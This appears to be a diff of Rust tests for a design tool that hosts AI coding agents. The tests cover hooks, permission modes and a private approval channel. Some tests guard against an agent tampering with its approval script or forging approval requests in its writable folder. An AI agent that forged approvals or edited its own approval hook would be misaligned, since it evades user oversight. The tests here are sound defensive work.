-        let _ = std::fs::remove_file(st.session_dir.join("agent-status.json"));
+        let _ = std::fs::remove_file(st.prepared_hook_paths().status());
         st
     }
 
     #[test]
     fn claude_hooks_file_is_a_valid_settings_file_and_the_launch_loads_it() {
+        // Skip mode loads the file in the session folder; Ask mode loads the private one (`ask_hooks_tests`).
         assert!(
             AgentCliPreset::Claude.cli_launch_command().contains("--settings \"$DESIGNOS_SESSION_DIR/hooks.json\""),
             "{}",
             AgentCliPreset::Claude.cli_launch_command()
         );
+        assert!(
+            AgentCliPreset::Claude.cli_launch_command_for_mode(PermissionMode::Ask).contains("--settings \"$DESIGNOS_CLAUDE_SETTINGS\""),
+            "{}",
+            AgentCliPreset::Claude.cli_launch_command_for_mode(PermissionMode::Ask)
+        );
 
         let st = provisioned_session(741);
-        let settings = read_json(&st.session_dir.join("hooks.json"));
+        let settings = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let top: Vec<&String> = settings.as_object().unwrap().keys().collect();
         assert_eq!(top, vec!["hooks"], "a --settings file takes Claude's settings keys only");
         let hooks = settings["hooks"].as_object().unwrap();
@@ -7724,7 +9230,7 @@ mod tests {
     #[test]
     fn session_hooks_drive_agent_status_from_working_to_done_in_every_supported_cli() {
         let st = provisioned_session(742);
-        let claude = read_json(&st.session_dir.join("hooks.json"));
+        let claude = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let grok = read_json(&st.session_dir.join(".grok").join("hooks").join("designos-status.json"));
         assert_eq!(
             claude["hooks"].as_object().unwrap().keys().collect::<Vec<_>>(),
@@ -7740,14 +9246,14 @@ mod tests {
         for (name, prompt, stop) in
             [("claude", cmd(&claude, "UserPromptSubmit"), cmd(&claude, "Stop")), ("grok", cmd(&grok, "UserPromptSubmit"), cmd(&grok, "Stop"))]
         {
-            let _ = std::fs::remove_file(st.session_dir.join("agent-status.json"));
+            let _ = std::fs::remove_file(st.prepared_hook_paths().status());
             run_hook_command(&prompt);
             assert_eq!(status_state(&st.session_dir).as_deref(), Some("working"), "{name}");
             run_hook_command(&stop);
             assert_eq!(status_state(&st.session_dir).as_deref(), Some("done"), "{name}");
         }
         // Antigravity: model call -> working, execution loop end -> done; handlers answer with a JSON object.
-        let _ = std::fs::remove_file(st.session_dir.join("agent-status.json"));
+        let _ = std::fs::remove_file(st.prepared_hook_paths().status());
         let reply = run_hook_command(&agy_flat("PreInvocation"));
         assert!(serde_json::from_str::<serde_json::Value>(reply.trim()).map(|v| v.is_object()).unwrap_or(false), "agy hook reply: {reply:?}");
         assert_eq!(status_state(&st.session_dir).as_deref(), Some("working"), "agy");
@@ -7755,9 +9261,8 @@ mod tests {
         assert_eq!(status_state(&st.session_dir).as_deref(), Some("done"), "agy");
     }
 
-    #[test]
-    fn prompt_hooks_print_only_what_each_cli_can_read_and_never_the_selection() {
-        let st = provisioned_session(743);
+    fn assert_prompt_hooks_print_only_what_each_cli_can_read(tab_id: u64) {
+        let st = provisioned_session(tab_id);
         let prompt_command = |v: &serde_json::Value| v["hooks"]["UserPromptSubmit"][0]["hooks"][0]["command"].as_str().unwrap().to_string();
 
         // Grok parses any stdout starting with `{` as a hook decision and discards an allowing
@@ -7766,7 +9271,7 @@ mod tests {
         assert_eq!(run_hook_command(&prompt_command(&grok)), "", "a Grok prompt hook must not print");
 
         // Claude reads `hookSpecificOutput.additionalContext`: the page, never the selection.
-        let claude = read_json(&st.session_dir.join("hooks.json"));
+        let claude = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let printed = run_hook_command(&prompt_command(&claude));
         let reply: serde_json::Value = serde_json::from_str(printed.trim()).expect("Claude hook prints decision json");
         let out = &reply["hookSpecificOutput"];
@@ -7777,6 +9282,11 @@ mod tests {
         assert_eq!(reply.as_object().unwrap().len(), 1, "no decision keys that could block the prompt: {printed}");
         // context.json (with the selection) stays on disk for the agent to read when asked.
         assert!(read_json(&st.context_json_path).get("selected_node_ids").is_some());
+    }
+
+    #[test]
+    fn prompt_hooks_print_only_what_each_cli_can_read_and_never_the_selection() {
+        assert_prompt_hooks_print_only_what_each_cli_can_read(743);
     }
 
     #[test]
@@ -7802,6 +9312,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg_attr(windows, ignore = "uses exited_stub_state which spawns POSIX sh and waits on POSIX PTY master reader_eof")]
     fn agent_that_exits_within_the_window_reports_a_start_failure_with_its_last_output() {
         let mut st = exited_stub_state();
         // A loaded CI runner can take longer than the window to start the shell; the window itself
@@ -7823,6 +9334,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg_attr(windows, ignore = "uses exited_stub_state which spawns POSIX sh and waits on POSIX PTY master reader_eof")]
     fn agent_that_exits_after_the_window_is_not_a_start_failure() {
         let mut st = exited_stub_state();
         st.active_tab_mut().unwrap().spawned_at = std::time::Instant::now() - std::time::Duration::from_secs(10);
@@ -7856,6 +9368,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg_attr(windows, ignore = "uses exited_stub_state which spawns POSIX sh and waits on POSIX PTY master reader_eof")]
     fn clicking_the_fix_on_the_failed_tab_panel_opens_a_shell_tab() {
         let ctx = egui::Context::default();
         crate::theme::install_fonts(&ctx);
@@ -8051,8 +9564,12 @@ mod tests {
         }
 
         let terminal_src = include_str!("terminal.rs");
-        let shipped_part = terminal_src.split("#[cfg(test)]\nmod tests").next().unwrap_or(terminal_src);
-        assert!(!shipped_part.contains("fn is_design_creation_prompt"), "is_design_creation_prompt must not exist in terminal.rs");
+        let crlf_terminal_src = terminal_src.replace("\r\n", "\n").replace('\n', "\r\n");
+        for candidate in [terminal_src, crlf_terminal_src.as_str()] {
+            let shipped_part =
+                candidate.split("#[cfg(test)]\r\nmod tests").next().unwrap_or(candidate).split("#[cfg(test)]\nmod tests").next().unwrap_or(candidate);
+            assert!(!shipped_part.contains("fn is_design_creation_prompt"), "is_design_creation_prompt must not exist in terminal.rs");
+        }
         kill_tabs(&mut st);
     }
 
@@ -8184,7 +9701,7 @@ mod tests {
         let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(280.0, 600.0));
 
         let run_one_frame = |st: &mut TerminalState, sel: &[NodeId]| -> Option<String> {
-            let text_id = Id::new(("test-text", "agent-selection-chip-left".to_string()));
+            let text_id = Id::new(("test-text", "agent-selection-chip".to_string()));
             ctx.data_mut(|d| d.remove_temp::<String>(text_id));
             let raw = egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1440.0, 900.0))), ..Default::default() };
             let _ = ctx.run_ui(raw, |ui| {
@@ -8196,8 +9713,8 @@ mod tests {
         };
 
         assert_eq!(run_one_frame(&mut st, &[]), None, "nothing selected: no chip text is painted");
-        assert_eq!(run_one_frame(&mut st, &[ids[0]]).as_deref(), Some("Page 1 · 1 selected · A"));
-        assert_eq!(run_one_frame(&mut st, &[ids[0], ids[1], ids[2]]).as_deref(), Some("Page 1 · 3 selected · A, B, +1"));
+        assert_eq!(run_one_frame(&mut st, &[ids[0]]).as_deref(), Some("A"));
+        assert_eq!(run_one_frame(&mut st, &[ids[0], ids[1], ids[2]]).as_deref(), Some("A, B, +1"));
         assert_eq!(run_one_frame(&mut st, &[]), None, "clearing the selection hides the chip again in the same frame");
 
         kill_tabs(&mut st);
@@ -8253,7 +9770,7 @@ mod tests {
                 let _ = show_left_with_selection(&mut st, ui, panel_rect, None, summary);
             });
         });
-        let chip_rect: Rect = ctx.data(|d| d.get_temp(Id::new(("test-rect", "agent-selection-chip-left".to_string())))).expect("chip rect recorded");
+        let chip_rect: Rect = ctx.data(|d| d.get_temp(Id::new(("test-rect", "agent-selection-chip".to_string())))).expect("chip rect recorded");
         let click_pos = chip_rect.center();
 
         // Frame 2: click the chip.
@@ -8281,58 +9798,6 @@ mod tests {
         let inner = String::from_utf8_lossy(&bytes[6..bytes.len() - 6]);
         assert!(inner.contains(&st.selection_spec_path.display().to_string()), "paste must reference selection.spec.json: {inner}");
         assert!(inner.contains("designos_export_spec"), "paste must mention designos_export_spec: {inner}");
-
-        kill_tabs(&mut st);
-        let _ = std::fs::remove_dir_all(&st.session_dir);
-    }
-
-    #[test]
-    fn header_strip_shows_chip_and_turn_status_side_by_side() {
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let (doc, page, ids) = make_three_layer_doc();
-        let sel = [ids[0], ids[1]];
-        let mut st = isolated_683_state(68302);
-        let _ = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-strip-1"));
-        let events_path = st.session_dir.join("agent-events.jsonl");
-        {
-            use std::io::Write;
-            let mut f = std::fs::OpenOptions::new().create(true).append(true).open(&events_path).unwrap();
-            writeln!(f, r#"{{"t":100.0,"e":"UserPromptSubmit","p":{{"session_id":"sid-strip-1"}}}}"#).unwrap();
-            writeln!(f, r#"{{"t":101.0,"e":"PreToolUse","p":{{"session_id":"sid-strip-1","tool_name":"mcp__designos__designos_create_node"}}}}"#).unwrap();
-        }
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(280.0, 600.0));
-        let frame = |st: &mut TerminalState, events: Vec<egui::Event>| -> Vec<TerminalAction> {
-            let raw = egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1440.0, 900.0))), events, ..Default::default() };
-            let mut out = Vec::new();
-            let _ = ctx.run_ui(raw, |ui| {
-                crate::agent_selection_chip::with_selection_summary(&doc, page, &sel, |summary| {
-                    out = show_left_with_selection(st, ui, panel_rect, None, summary);
-                });
-            });
-            out
-        };
-        let rect_of = |name: &str| -> Option<Rect> { ctx.data(|d| d.get_temp(Id::new(("test-rect", name.to_string())))) };
-
-        let _ = frame(&mut st, vec![]);
-        assert!(matches!(st.tabs[0].effective_status(), AgentTabStatus::Working(_)), "tab must be Working");
-        let _ = frame(&mut st, vec![]);
-        let chip = rect_of("agent-selection-chip-left").expect("selection chip stays visible while the turn runs");
-        let status = rect_of("agents-header-turn-status").expect("turn status is visible");
-        assert!(!chip.intersects(status), "chip {chip:?} and status {status:?} must not overlap");
-        assert!(chip.right() < status.left(), "chip on the left, status right-aligned");
-        assert!(status.right() <= panel_rect.right(), "status stays inside the panel");
-        assert!(chip.height() >= theme::TARGET_MIN - 0.01 && status.height() >= theme::TARGET_MIN - 0.01, "targets keep the minimum height");
-
-        let pos = chip.center();
-        let click = vec![
-            egui::Event::PointerMoved(pos),
-            egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: true, modifiers: egui::Modifiers::NONE },
-            egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: false, modifiers: egui::Modifiers::NONE },
-        ];
-        let emitted = frame(&mut st, click);
-        assert_eq!(emitted, vec![TerminalAction::SendSelectionToAgent], "chip is still clickable while Working");
 
         kill_tabs(&mut st);
         let _ = std::fs::remove_dir_all(&st.session_dir);
@@ -8411,9 +9876,10 @@ mod tests {
                 let _ = show_left_with_selection(&mut st, ui, panel_rect, None, summary);
             });
         });
-        let (left_rect, left_text) = recorded(&ctx, "agent-selection-chip-left");
-        assert!(left_rect.is_some(), "a selected layer shows the chip in the strip");
-        assert_eq!(left_text.as_deref(), Some("Page 1 · 1 selected · A"));
+        assert_eq!(recorded(&ctx, "agent-selection-chip-left"), (None, None), "the header strip no longer holds the chip");
+        let (chip_rect, chip_text) = recorded(&ctx, "agent-selection-chip");
+        assert!(chip_rect.is_some(), "a selected layer shows the chip in the composer");
+        assert_eq!(chip_text.as_deref(), Some("A"));
 
         kill_tabs(&mut st);
         let _ = std::fs::remove_dir_all(&st.session_dir);
@@ -8441,7 +9907,7 @@ mod tests {
 
     #[test]
     fn context_reply_still_excludes_the_selection() {
-        prompt_hooks_print_only_what_each_cli_can_read_and_never_the_selection();
+        assert_prompt_hooks_print_only_what_each_cli_can_read(744);
     }
 
     /// Every option `gemini --help` lists in Gemini CLI 0.38.2 (`plans/reports/release-060-evidence/cli-help-261019/gemini-help.txt`).
@@ -8616,7 +10082,7 @@ mod tests {
                 log.push_str("Error: 429 rate_limit_error: Rate limit reached. Resets at 14:30\n");
             }
         }
-        let claude_hooks = read_json(&st.session_dir.join("hooks.json"));
+        let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let stop_failure_cmd = claude_hooks["hooks"]["StopFailure"][0]["hooks"][0]["command"].as_str().expect("StopFailure hook command").to_string();
         run_hook_command(&stop_failure_cmd);
         let _ = st.poll_live_agent_bridge();
@@ -8652,6 +10118,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg_attr(windows, ignore = "uses exited_stub_state which spawns POSIX sh and waits on POSIX PTY master reader_eof")]
     fn non_zero_exit_after_start_window_records_session_failure_and_zero_exit_does_not() {
         let mut st = exited_stub_state();
         st.active_tab_mut().unwrap().spawned_at = std::time::Instant::now() - std::time::Duration::from_secs(10);
@@ -8739,6 +10206,33 @@ mod tests {
         assert_eq!(home_before, home_after, "$HOME/.gemini/settings.json must never be modified by Studio");
     }
 
+    /// `gemini mcp list` in `session_dir`, as the live check runs it, against a scratch home so that it never writes to the
+    /// user's `~/.gemini` (Gemini's project registry and login live there). The placeholder key only satisfies the auth check
+    /// that comes before the listing: nothing logs in, and no model is called.
+    fn gemini_mcp_list_command(session_dir: &Path, trusted_path: &Path) -> std::process::Command {
+        let bin =
+            crate::cli_resolve::resolve_in(&crate::cli_resolve::cli_search_dirs(None), "gemini").unwrap_or_else(|| std::ffi::OsString::from("gemini").into());
+        let mut list_cmd = std::process::Command::new(bin);
+        list_cmd.args(["mcp", "list"]).current_dir(session_dir).env("GEMINI_CLI_TRUSTED_FOLDERS_PATH", trusted_path);
+        crate::scratch_cli_home::isolate_cli_homes(&mut list_cmd);
+        list_cmd.env("GEMINI_API_KEY", "placeholder-not-a-key");
+        list_cmd
+    }
+
+    #[test]
+    fn the_live_check_of_gemini_uses_a_scratch_home() {
+        let session = std::env::temp_dir().join("designos-live-check-session");
+        let cmd = gemini_mcp_list_command(&session, &session.join(".gemini").join("trustedFolders.json"));
+        let env = |name: &str| cmd.get_envs().find(|(key, _)| *key == name).and_then(|(_, value)| value).map(PathBuf::from);
+        let home = env("GEMINI_CLI_HOME").expect("Gemini's home folder is moved off the user's");
+        assert_eq!(env("HOME").as_deref(), Some(home.as_path()), "anything that asks the OS for the home gets the scratch one too");
+        assert!(home.starts_with(std::env::temp_dir()), "{}", home.display());
+        assert!(std::env::var_os("HOME").is_none_or(|real| !home.starts_with(real)), "the scratch home sits inside the real one");
+        assert!(home.join(".gemini").join("settings.json").is_file(), "the scratch home carries the auth type `gemini mcp list` checks");
+        assert!(env("GEMINI_API_KEY").is_some(), "a placeholder key satisfies that check; no login happens");
+        assert!(cmd.get_args().eq(["mcp", "list"]) && cmd.get_current_dir() == Some(session.as_path()));
+    }
+
     #[test]
     fn gemini_live_check() {
         let mut st = isolated_683_state(780);
@@ -8753,7 +10247,7 @@ mod tests {
         assert!(trusted_path.is_file());
 
         // Verify the Gemini PTY session resolves cwd to `session_dir` and configures `GEMINI_CLI_TRUSTED_FOLDERS_PATH`.
-        assert_eq!(resolve_pty_cwd(AgentCliPreset::Gemini, Some(&st.session_dir), PathBuf::from("/tmp")), st.session_dir);
+        assert_eq!(resolve_pty_cwd(AgentCliPreset::Gemini, Some(&st.session_dir), Some(PathBuf::from("/tmp"))), st.session_dir);
         let mut pty_cmd = CommandBuilder::new("gemini");
         configure_pty_env_with_session(&mut pty_cmd, AgentCliPreset::Gemini, None, Some(&st.session_env()));
         assert_eq!(pty_cmd.get_env("GEMINI_CLI_TRUSTED_FOLDERS_PATH"), Some(trusted_path.as_os_str()));
@@ -8765,9 +10259,7 @@ mod tests {
         assert!(argv.windows(2).any(|w| w == ["--", "--workspace"]), "must separate --workspace with --: {argv:?}");
 
         if runtime_binary_available("gemini") {
-            let mut list_cmd = std::process::Command::new("gemini");
-            list_cmd.args(["mcp", "list"]).current_dir(&st.session_dir).env("GEMINI_CLI_TRUSTED_FOLDERS_PATH", &trusted_path);
-            if let Ok(out) = list_cmd.output() {
+            if let Ok(out) = gemini_mcp_list_command(&st.session_dir, &trusted_path).output() {
                 let combined = format!("{}\n{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr));
                 assert!(combined.contains("designos:"), "gemini mcp list must discover the session-scoped designos server: {combined}");
             }
@@ -8816,10 +10308,15 @@ mod tests {
 
     /// A terminal state on a cleared session folder, which is removed again when the test ends (see [`ScopedTerminalState`]).
     fn isolated_683_state(tab_id: u64) -> ScopedTerminalState {
-        let dir = std::env::temp_dir().join("designos-sessions").join(tab_session_id(&format!("p{}", std::process::id()), tab_id));
+        let dir = crate::agent_session_files::ephemeral_session_dir(&tab_session_id(&format!("p{}", std::process::id()), tab_id));
         let _ = std::fs::remove_dir_all(&dir);
         let _ = std::fs::create_dir_all(&dir);
         ScopedTerminalState::new(TerminalState::for_tab(tab_id))
+    }
+
+    /// The private approvals folder of tab `idx`.
+    fn tab_approvals_of(st: &TerminalState, idx: usize) -> PathBuf {
+        st.tabs[idx].approvals_dir.clone().expect("a session tab has a private approvals folder")
     }
 
     fn spawn_mock_agent_tab(st: &mut TerminalState, preset: AgentCliPreset, session_uuid: Option<&str>) -> usize {
@@ -8838,9 +10335,9 @@ mod tests {
         let tmp = std::env::temp_dir().join(format!("designos-683-hook-cmd-{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&tmp);
         std::fs::create_dir_all(&tmp).unwrap();
-        let status_path = tmp.join("agent-status.json");
-        let events_path = tmp.join("agent-events.jsonl");
-        let cmd_str = status_hook_command(&status_path, "PreToolUse", "working");
+        let hook_paths = crate::agent_hook_outputs::HookPaths::at(&tmp, &tmp);
+        let events_path = hook_paths.events();
+        let cmd_str = status_hook_command(&hook_paths, "PreToolUse", "working");
 
         let mut child = std::process::Command::new("sh").arg("-c").arg(&cmd_str).stdin(std::process::Stdio::piped()).spawn().expect("spawn hook command");
         {
@@ -8866,7 +10363,7 @@ mod tests {
     fn stub_cli_drives_running_needs_input_done() {
         let mut st = isolated_683_state(68301);
         let _ = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-drive-1"));
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
 
         let write_rec = |line: &str| {
             use std::io::Write;
@@ -8900,7 +10397,7 @@ mod tests {
         let bg_idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-bg"));
         st.active_tab = active_idx;
 
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
         std::fs::write(
             &events_path,
             concat!(
@@ -8923,18 +10420,20 @@ mod tests {
     #[test]
     fn receipt_shows_exact_duration_and_counts() {
         let mut tracker = crate::agent_turn_status::TabTurnTracker::default();
-        let submit = crate::agent_turn_status::AgentEventRecord { t: 100.0, e: "UserPromptSubmit".to_string(), p: serde_json::json!({"session_id": "s1"}) };
+        let submit =
+            crate::agent_turn_status::AgentEventRecord { t: 100.0, e: "UserPromptSubmit".to_string(), tab: None, p: serde_json::json!({"session_id": "s1"}) };
         let _ = tracker.on_event(&submit);
         for i in 0..12 {
             let pre = crate::agent_turn_status::AgentEventRecord {
                 t: 101.0 + f64::from(i),
                 e: "PreToolUse".to_string(),
+                tab: None,
                 p: serde_json::json!({"session_id": "s1", "tool_name": "designos_update_node"}),
             };
             let _ = tracker.on_event(&pre);
         }
         tracker.record_touched_layers([1, 2, 3, 4, 5, 6, 7]);
-        let stop = crate::agent_turn_status::AgentEventRecord { t: 180.0, e: "Stop".to_string(), p: serde_json::json!({"session_id": "s1"}) };
+        let stop = crate::agent_turn_status::AgentEventRecord { t: 180.0, e: "Stop".to_string(), tab: None, p: serde_json::json!({"session_id": "s1"}) };
         let eff = tracker.on_event(&stop);
         let receipt = eff.receipt.expect("receipt emitted on Stop");
         assert_eq!(receipt.format_line(), "Worked for 1m 20s · 12 tool calls · 7 layers changed");
@@ -8951,10 +10450,15 @@ mod tests {
     #[test]
     fn no_count_is_invented_without_data() {
         let mut tracker = crate::agent_turn_status::TabTurnTracker::default();
-        let _ = tracker.on_event(&crate::agent_turn_status::AgentEventRecord { t: 10.0, e: "UserPromptSubmit".to_string(), p: serde_json::json!({}) });
         let _ =
-            tracker.on_event(&crate::agent_turn_status::AgentEventRecord { t: 11.0, e: "PreToolUse".to_string(), p: serde_json::json!({"tool_name": "Read"}) });
-        let eff = tracker.on_event(&crate::agent_turn_status::AgentEventRecord { t: 15.0, e: "Stop".to_string(), p: serde_json::json!({}) });
+            tracker.on_event(&crate::agent_turn_status::AgentEventRecord { t: 10.0, e: "UserPromptSubmit".to_string(), tab: None, p: serde_json::json!({}) });
+        let _ = tracker.on_event(&crate::agent_turn_status::AgentEventRecord {
+            t: 11.0,
+            e: "PreToolUse".to_string(),
+            tab: None,
+            p: serde_json::json!({"tool_name": "Read"}),
+        });
+        let eff = tracker.on_event(&crate::agent_turn_status::AgentEventRecord { t: 15.0, e: "Stop".to_string(), tab: None, p: serde_json::json!({}) });
         let receipt = eff.receipt.expect("receipt emitted");
         assert_eq!(receipt.layers_changed, None);
         let line = receipt.format_line();
@@ -8972,7 +10476,7 @@ mod tests {
         st.window_focused = false;
         st.surface_visible = true;
 
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
         std::fs::write(
             &events_path,
             concat!(
@@ -9012,7 +10516,7 @@ mod tests {
         st.surface_visible = true;
 
         std::fs::write(
-            st.session_dir.join("agent-events.jsonl"),
+            st.prepared_hook_paths().events(),
             concat!(
                 "{\"t\":10.0,\"e\":\"UserPromptSubmit\",\"p\":{\"session_id\":\"sid-notify-perm\"}}\n",
                 "{\"t\":11.0,\"e\":\"PermissionRequest\",\"p\":{\"session_id\":\"sid-notify-perm\",\"tool_name\":\"Bash\"}}\n",
@@ -9041,6 +10545,7 @@ mod tests {
             tool_name: "Bash".into(),
             input_summary: "cargo test".into(),
             timestamp: 1,
+            target: String::new(),
         });
         assert_eq!(st.tabs[idx].header_status_indicator(0).map(|(_, t)| t).as_deref(), Some("Needs approval"));
 
@@ -9069,7 +10574,7 @@ mod tests {
         st.window_focused = true;
         st.surface_visible = true;
 
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
         std::fs::write(
             &events_path,
             concat!(
@@ -9086,18 +10591,11 @@ mod tests {
 
     #[test]
     fn hook_files_carry_both_the_event_stream_and_the_turn_marks() {
-        let status_path = std::path::Path::new("/tmp/designos-683-677-hooks/agent-status.json");
+        let status_path =
+            &crate::agent_hook_outputs::HookPaths::at(std::path::Path::new("/tmp/designos-683-session"), std::path::Path::new("/tmp/designos-683-677-hooks"));
         let command_of = |v: &serde_json::Value, event: &str| v["hooks"][event][0]["hooks"][0]["command"].as_str().unwrap_or_default().to_string();
-        let claude = session_hooks_settings(
-            status_path,
-            Some((
-                std::path::Path::new("/tmp/designos-683-677-hooks/reply.json"),
-                std::path::Path::new("/tmp/designos-683-677-hooks/bootstrap-context-reply.json"),
-                std::path::Path::new("/tmp/designos-683-677-hooks/bootstrap.delivered.1"),
-            )),
-            None,
-        );
-        let grok = session_hooks_settings(status_path, None, None);
+        let claude = session_hooks_settings(status_path, Some(1), false);
+        let grok = session_hooks_settings(status_path, None, false);
         for (cli, settings) in [("claude", &claude), ("grok", &grok)] {
             let start = command_of(settings, "UserPromptSubmit");
             assert!(start.contains("agent-events.jsonl") && start.contains("\"turn_mark\":\"start\"") && start.contains(cli), "{cli} prompt hook: {start}");
@@ -9111,7 +10609,7 @@ mod tests {
             }
         }
         assert!(
-            command_of(&claude, "UserPromptSubmit").contains("else cat '/tmp/designos-683-677-hooks/reply.json'; fi"),
+            command_of(&claude, "UserPromptSubmit").contains("else cat '/tmp/designos-683-677-hooks/page-context-reply.json' 2>/dev/null || true; fi"),
             "Claude still answers with the page context once the bootstrap block was delivered"
         );
         // Attached skills are `additionalContext` of the prompt hook's own handlers, one per slot: each prints nothing, and
@@ -9154,7 +10652,10 @@ mod tests {
                 let raw = std::fs::read_to_string(st.session_dir.join(rel)).unwrap_or_else(|e| panic!("{rel}: {e}"));
                 serde_json::from_str(&raw).unwrap_or_else(|e| panic!("{rel} is not JSON: {e}"))
             };
-            let claude = read("hooks.json");
+            let claude: serde_json::Value = {
+                let path = crate::agent_permissions::claude_hooks_path(&st);
+                serde_json::from_str(&std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("{}: {e}", path.display()))).expect("hooks are JSON")
+            };
             let grok = read(".grok/hooks/designos-status.json");
             assert!(claude.get("permissions").is_none(), "hooks.json must never set permissions.allow: {claude}");
 
@@ -9200,14 +10701,61 @@ mod tests {
                 assert_eq!(claude_permission.len(), 2, "Claude PermissionRequest = status handler + approval handler: {claude_permission:?}");
                 assert_eq!(approve.len(), 1);
                 assert_eq!(approve[0]["timeout"].as_u64(), Some(crate::agent_permissions::APPROVAL_HOOK_TIMEOUT_SECS));
-                assert!(st.session_dir.join("approve-hook.sh").is_file(), "approve-hook.sh must be written for the hook to run");
+                let script = crate::agent_approval_channel::hook_script_path(&st.session_dir).expect("a private channel folder");
+                assert!(script.is_file(), "approve-hook.sh must be written for the hook to run");
+                assert_eq!(approve[0]["command"].as_str(), crate::agent_permissions::approval_hook_handler(&script)["command"].as_str());
+                assert!(!st.session_dir.join("approve-hook.sh").exists(), "the hook must not sit in the folder the agent can write");
             } else {
                 assert_eq!(claude_permission.len(), 1, "Skip mode keeps only the status handler: {claude_permission:?}");
                 assert!(approve.is_empty(), "Skip mode must not install the approval hook");
+                let channel = crate::agent_approval_channel::channel_dir(&st.session_dir).expect("a private channel location");
+                assert!(
+                    !channel.join(crate::agent_approval_channel::HOOK_SCRIPT_NAME).exists()
+                        && !channel.join(crate::agent_approval_channel::HOOKS_FILE_NAME).exists(),
+                    "Skip mode makes no approval script and no hooks file: {}",
+                    channel.display()
+                );
             }
             assert_eq!(hook_handlers(&grok, "PermissionRequest").len(), 1, "Grok never runs the Claude approval script");
+            crate::agent_approval_channel::remove_channel(&st.session_dir);
             let _ = std::fs::remove_dir_all(&st.session_dir);
         }
+    }
+
+    /// The approval channel is the session's: closing one tab withdraws that tab's requests and keeps the others, and the
+    /// whole private folder goes when the session shuts down or moves to another folder.
+    #[test]
+    fn the_private_channel_goes_with_the_session() {
+        let mut st = isolated_683_state(68414);
+        st.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
+        let first = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-channel-1"));
+        let second = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-channel-2"));
+        let script = crate::agent_permissions::write_approval_hook_script(&st.session_dir).expect("install the hook");
+        let channel = crate::agent_approval_channel::channel_dir(&st.session_dir).unwrap();
+        let (first_dir, second_dir) = (tab_approvals_of(&st, first), tab_approvals_of(&st, second));
+        for (dir, id) in [(&first_dir, "8001-Bash"), (&second_dir, "8002-Bash")] {
+            crate::agent_approval_channel::create_private_dir_all(dir).unwrap();
+            let request = serde_json::json!({ "id": id, "tool_name": "Bash", "summary": "ls", "timestamp": crate::agent_sessions::unix_timestamp_secs() });
+            std::fs::write(dir.join(format!("{id}.request.json")), request.to_string()).unwrap();
+        }
+
+        st.close_tab(first);
+        assert_eq!(std::fs::read_to_string(first_dir.join("8001-Bash.answer")).unwrap().trim(), "withdrawn", "the closed tab's request is withdrawn");
+        assert!(!second_dir.join("8002-Bash.answer").exists(), "the other tab's request is left alone");
+        assert!(script.is_file() && channel.is_dir(), "a tab is still running: the channel stays");
+
+        st.shutdown();
+        assert!(!channel.exists(), "shutting the session down removes the private channel: {}", channel.display());
+
+        // A session that moves to another folder, with no tab left, takes its channel along.
+        let old_session = st.session_dir.clone();
+        crate::agent_permissions::write_approval_hook_script(&old_session).expect("install the hook again");
+        let old_channel = crate::agent_approval_channel::channel_dir(&old_session).unwrap();
+        st.bind_session(&format!("68414-moved-{}", std::process::id()));
+        assert_ne!(st.session_dir, old_session);
+        assert!(!old_channel.exists(), "the channel of the folder being left is removed: {}", old_channel.display());
+        let _ = std::fs::remove_dir_all(&old_session);
+        let _ = std::fs::remove_dir_all(&st.session_dir);
     }
 
     #[test]
@@ -9226,7 +10774,7 @@ mod tests {
             st.window_focused = focused;
             st.surface_visible = visible;
 
-            let approvals_dir = st.tabs[idx].approvals_dir.clone();
+            let approvals_dir = st.tabs[idx].approvals_dir.clone().expect("a session tab has a private approvals folder");
             if mode == Ask {
                 std::fs::create_dir_all(&approvals_dir).unwrap();
                 let request = serde_json::json!({
@@ -9235,7 +10783,7 @@ mod tests {
                 std::fs::write(approvals_dir.join("5001-Bash.request.json"), request.to_string()).unwrap();
             }
             std::fs::write(
-                st.session_dir.join("agent-events.jsonl"),
+                st.prepared_hook_paths().events(),
                 concat!(
                     "{\"t\":400.0,\"e\":\"UserPromptSubmit\",\"p\":{\"session_id\":\"sid-both\"}}\n",
                     "{\"t\":401.0,\"e\":\"PermissionRequest\",\"p\":{\"session_id\":\"sid-both\",\"tool_name\":\"Bash\"}}\n",
@@ -9275,175 +10823,46 @@ mod tests {
         }
     }
 
+    /// The session folder is the agent's working folder, so anything it writes there is the agent's own doing. A request
+    /// file forged in any of the folders Studio once polled must not raise a card, and answering a forged id writes no
+    /// answer file back into them.
     #[test]
-    fn header_strip_gives_its_right_slot_to_a_pending_approval() {
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let (doc, page, ids) = make_three_layer_doc();
-        let sel = [ids[0], ids[1]];
-        let mut st = isolated_683_state(68412);
+    fn a_request_forged_in_the_session_folder_raises_no_card() {
+        let mut st = isolated_683_state(68413);
